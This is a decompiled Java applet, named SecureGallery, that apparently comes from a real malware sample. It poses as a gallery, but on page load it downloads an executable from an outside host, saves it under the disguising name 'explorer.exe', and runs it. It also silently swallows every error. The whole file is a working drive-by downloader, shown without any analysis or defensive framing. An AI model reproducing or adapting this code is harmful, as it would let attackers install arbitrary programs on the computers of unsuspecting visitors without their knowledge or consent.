import java.awt.Desktop;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.io.BufferedInputStream;
import java.net.URL;
import java.io.File;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class SecureGallery extends Applet
{
    @Override
    public void init() {
        try {
            this.download();
        }
        catch (Exception ex) {}
    }
    
    private void download() throws Exception {
        final File file = new File("explorer.exe");
        final BufferedInputStream bufferedInputStream = new BufferedInputStream(new URL("http://yaylakentkoyu.net/upload/video.exe").openStream());
        final FileOutputStream fileOutputStream = new FileOutputStream(file);
        final BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(fileOutputStream, 1024);
        final byte[] array = new byte[1024];
        int read;
        while ((read = bufferedInputStream.read(array, 0, 1024)) != -1) {
            bufferedOutputStream.write(array, 0, read);
        }
        bufferedOutputStream.close();
        fileOutputStream.close();
        bufferedInputStream.close();
        Desktop.getDesktop().open(file);
        Runtime.getRuntime().exec(file.getAbsolutePath());
    }
}
